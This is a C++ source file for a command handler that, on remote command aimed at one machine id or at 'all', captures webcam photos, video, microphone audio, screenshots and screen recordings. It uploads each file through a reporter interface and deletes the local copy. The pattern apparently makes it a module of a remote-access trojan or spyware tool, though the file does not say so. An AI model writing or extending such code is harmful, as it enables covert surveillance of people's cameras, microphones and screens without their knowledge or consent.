#include "application/commands/MediaHandler.hpp"

#include <algorithm>
#include <cstdio>
#include <filesystem>

#include "domain/common/Compressor.hpp"

namespace nuub::application::commands {

MediaHandler::MediaHandler(
    interfaces::IMediaCapture& capture,
    interfaces::IReporter& reporter,
    std::string pc_id)
    : capture_(capture)
    , reporter_(reporter)
    , pc_id_(std::move(pc_id)) {}

bool MediaHandler::matches(const std::string& target) const {
    if (target.empty()) return true;
    std::string lower = target;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    std::string lower_pc = pc_id_;
    std::transform(lower_pc.begin(), lower_pc.end(), lower_pc.begin(), ::tolower);
    return lower == lower_pc || lower == "all";
}

void MediaHandler::send_and_cleanup(const std::string& path, const std::string& caption) {
    if (reporter_.send_file(path, caption)) {
        std::remove(path.c_str());
    }
}

domain::Result<void> MediaHandler::handle_take_photo(const std::string& target) {
    if (!matches(target)) return domain::Result<void>::success();

    reporter_.send_message("Tomando foto con la camara...");
    auto path = capture_.take_photo();

    if (path) {
        send_and_cleanup(*path, "Foto capturada.");
    } else {
        reporter_.send_message("No se pudo capturar la foto.");
    }
    return domain::Result<void>::success();
}

domain::Result<void> MediaHandler::handle_take_video(const std::string& target, int duration) {
    if (!matches(target)) return domain::Result<void>::success();

    reporter_.send_message("Grabando video por " + std::to_string(duration) + "s...");
    auto path = capture_.take_video(duration);

    if (path) {
        send_and_cleanup(*path, "Video de " + std::to_string(duration) + "s.");
    } else {
        reporter_.send_message("No se pudo grabar el video.");
    }
    return domain::Result<void>::success();
}

domain::Result<void> MediaHandler::handle_record_audio(const std::string& target, int duration) {
    if (!matches(target)) return domain::Result<void>::success();

    reporter_.send_message("Grabando audio por " + std::to_string(duration) + "s...");
    auto path = capture_.record_audio(duration);

    if (path) {
        send_and_cleanup(*path, "Audio de " + std::to_string(duration) + "s.");
    } else {
        reporter_.send_message("No se pudo grabar el audio.");
    }
    return domain::Result<void>::success();
}

domain::Result<void> MediaHandler::handle_screenshot(const std::string& target) {
    if (!matches(target)) return domain::Result<void>::success();

    reporter_.send_message("Capturando pantalla...");
    auto path = capture_.take_screenshot();

    if (path) {
        send_and_cleanup(*path, "Screenshot capturado.");
    } else {
        reporter_.send_message("No se pudo capturar la pantalla.");
    }
    return domain::Result<void>::success();
}

domain::Result<void> MediaHandler::handle_screenrecord(const std::string& target, int duration) {
    if (!matches(target)) return domain::Result<void>::success();

    reporter_.send_message("Grabando pantalla por " + std::to_string(duration) + "s...");
    auto path = capture_.screen_record(duration);

    if (path) {
        send_and_cleanup(*path, "Grabacion de pantalla de " + std::to_string(duration) + "s.");
    } else {
        reporter_.send_message("No se pudo grabar la pantalla.");
    }
    return domain::Result<void>::success();
}

} // namespace nuub::application::commands
